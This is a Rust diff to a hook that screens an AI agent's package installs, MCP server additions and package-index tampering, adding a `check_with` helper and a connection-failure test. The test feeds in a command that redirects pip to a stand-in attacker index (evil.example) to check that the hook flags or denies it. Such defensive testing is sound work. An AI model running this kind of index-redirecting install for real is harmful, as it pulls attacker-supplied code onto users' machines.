@@ -522,9 +522,7 @@ pub async fn evaluate_call(
             if targets.is_empty() {
                 return Ok((!tampering.is_empty()).then(|| tamper_decision(None, &tampering)));
             }
-            let checker = Checker::connect(&opts.server, &opts.local).await?;
-            let results =
-                check_targets_within(&targets, Some(&checker), client, Some(HOOK_BUDGET)).await;
+            let results = check_with(&targets, opts, client).await;
             let decision = decide(&results, opts.fail_closed).map(|d| HookDecision {
                 reason: format!(
                     "This edit adds MCP servers that the agent starts itself, outside this hook.\n{}",
@@ -561,13 +559,7 @@ pub async fn evaluate_call(
     if targets.is_empty() && expanded.mismatches.is_empty() {
         return Ok((!tampering.is_empty()).then(|| tamper_decision(None, &tampering)));
     }
-    let needs_checker = targets.iter().any(|t| matches!(t, Target::Package { .. }));
-    let checker = if needs_checker {
-        Some(Checker::connect(&opts.server, &opts.local).await?)
-    } else {
-        None
-    };
-    let results = check_targets_within(targets, checker.as_ref(), client, Some(HOOK_BUDGET)).await;
+    let results = check_with(targets, opts, client).await;
     let mut results: Vec<TargetResult> = results
         .into_iter()
         .enumerate()
@@ -585,6 +577,32 @@ pub async fn evaluate_call(
         return Ok(decision);
     }
     Ok(Some(tamper_decision(decision, &tampering)))
+}
+
+/// Check `targets`, connecting to the server or building an in-process engine only when a
+/// registry package needs one. When neither works, those packages come back `Failed` with
+/// the reason, and the rest (specs that need no checker) as usual, so the decision still
+/// asks about them and about any tampering, and `--fail-closed` denies.
+async fn check_with(targets: &[Target], opts: &HookOptions, client: &str) -> Vec<TargetResult> {
+    let needs_checker = targets.iter().any(|t| matches!(t, Target::Package { .. }));
+    let (checker, error) = if needs_checker {
+        match Checker::connect(&opts.server, &opts.local).await {
+            Ok(c) => (Some(c), None),
+            Err(e) => (None, Some(format!("{e:#}"))),
+        }
+    } else {
+        (None, None)
+    };
+    let mut results =
+        check_targets_within(targets, checker.as_ref(), client, Some(HOOK_BUDGET)).await;
+    if let Some(error) = error {
+        for r in &mut results {
+            if let TargetResult::Failed { message, .. } = r {
+                *message = format!("no checker: {error}");
+            }
+        }
+    }
+    results
 }
 
 /// The text an edit leaves in `path`: a Write's `content`, or the current file with each
@@ -1175,6 +1193,41 @@ mod tests {
         .unwrap();
         assert!(d.reason.contains("PIP_INDEX_URL"), "{}", d.reason);
         assert_eq!(evaluate(&ps("Get-ChildItem C:\\"), &opts).await.unwrap(), None);
+    }
+
+    #[tokio::test]
+    async fn connect_failure_keeps_tamper_and_unverifiable() {
+        // No server, and an in-process engine that cannot start: a broken policy file.
+        let d = tempfile::tempdir().unwrap();
+        let config = d.path().join("customs.toml");
+        std::fs::write(&config, "mode = = 'broken'\n").unwrap();
+        let opts = |fail_closed| HookOptions {
+            server: "http://127.0.0.1:1".into(),
+            fail_closed,
+            local: LocalOptions {
+                config: Some(config.clone()),
+                models: None,
+                data_dir: Some(d.path().join("data")),
+            },
+        };
+        let bash = |cmd: &str| {
+            json!({"hook_event_name": "PreToolUse", "tool_name": "Bash",
+                   "tool_input": {"command": cmd}, "cwd": "/tmp"})
+            .to_string()
+        };
+        let tamper = bash("PIP_INDEX_URL=https://evil.example/simple pip install requests");
+        let d1 = evaluate(&tamper, &opts(false)).await.unwrap().unwrap();
+        assert_eq!(d1.decision, "ask");
+        assert!(d1.reason.contains("PIP_INDEX_URL"), "{}", d1.reason);
+        let d2 = evaluate(&tamper, &opts(true)).await.unwrap().unwrap();
+        assert_eq!(d2.decision, "deny");
+        assert!(d2.reason.contains("pypi:requests"), "{}", d2.reason);
+        assert!(d2.reason.contains("PIP_INDEX_URL"), "{}", d2.reason);
+        // A spec that needs no checker still asks.
+        let git = bash("pip install requests git+https://github.com/a/b");
+        let d3 = evaluate(&git, &opts(false)).await.unwrap().unwrap();
+        assert_eq!(d3.decision, "ask");
+        assert!(d3.reason.contains("git+https://github.com/a/b"), "{}", d3.reason);
     }
 
     #[tokio::test]
